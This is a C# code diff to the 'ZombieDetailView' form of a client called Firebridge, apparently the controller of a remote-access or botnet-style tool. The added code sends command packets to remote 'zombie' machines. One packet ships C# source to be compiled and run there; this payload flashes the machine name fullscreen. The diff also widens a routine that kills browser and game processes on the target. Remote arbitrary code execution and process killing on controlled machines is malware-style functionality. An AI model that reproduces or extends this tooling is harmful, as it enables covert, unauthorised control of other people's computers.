@@ -8,6 +8,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using FirebridgeClient.Controls;
 using FirebridgeShared.Models;
 using FirebridgeShared.Networking;
 
@@ -16,10 +17,19 @@ namespace FirebridgeClient.Views
     public partial class ZombieDetailView : Form
     {
         private Connection connection;
-        public ZombieDetailView(Connection connection)
+        private ZombieView _parent;
+        public ZombieDetailView(Connection connection, ZombieView parent)
         {
             InitializeComponent();
             this.connection = connection;
+            _parent = parent;
+
+            this.BackColor = ColorTranslator.FromHtml("#2c2c54");
+        }
+
+        public void SetImage(Image image)
+        {
+            _image.Image = image;
         }
 
         public void Update(object sender, EventArgs e)
@@ -83,7 +93,7 @@ namespace FirebridgeClient.Views
                             if (process.MainWindowTitle != """")
                             {
                                 string k = process.ProcessName.ToLower();
-                                if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"")
+                                if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"" || k == ""opera"" || k == ""lfs"" || k == ""witchit"")
                                     process.Kill();
                             }
                         }
@@ -98,6 +108,82 @@ namespace FirebridgeClient.Views
                                 {
                                     "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll"
                                 },
+                }
+            });
+        }
+
+        private void Button4_Click_1(object sender, EventArgs e)
+        {
+
+        }
+
+
+        private void Button5_Click(object sender, EventArgs e)
+        {
+            connection.SendPacket(new Packet(){Id = 7});
+        }
+
+        private void Button6_Click(object sender, EventArgs e)
+        {
+            connection.SendPacket(new Packet() { Id = 8 });
+        }
+
+        private void ZombieDetailView_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            _parent.DetailShow = false;
+            e.Cancel = true;
+            this.Hide();
+
+        }
+
+        private void _image_DoubleClick(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Button7_Click(object sender, EventArgs e)
+        {
+
+            connection.SendPacket(new Packet()
+            {
+                Id = 1,
+                Data = new MiniProgramModel()
+                {
+                    Code = @"using System;
+using System.Drawing;
+using System.Threading;
+using System.Windows.Forms;
+using FirebridgeShared.Networking;
+using System.Threading.Tasks;
+
+namespace TestApp
+{
+    public static class Program
+    {
+        public static void Main(Connection s)
+        {
+Task.Run(() => {
+            var form = new Form();
+            form.FormBorderStyle = FormBorderStyle.None;
+            form.WindowState = FormWindowState.Maximized;
+            Label label = new Label();
+            label.Text = Environment.MachineName;
+            label.AutoSize = true;
+            label.Font = new Font(""Microsoft Sans Serif"", 120F, FontStyle.Regular, GraphicsUnit.Point, 238);
+            form.Controls.Add(label);
+            form.Show();
+form.BringToFront();
+            label.Location = new Point(10,10);
+            form.Refresh();
+            Thread.Sleep(2500); form.Dispose(); });
+        }
+    }
+}",
+                    EntryPoint = "TestApp.Program",
+                    References = new List<string>()
+                    {
+                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll","System.Drawing.dll","System.Windows.Forms.dll"
+                    },
                 }
             });
         }
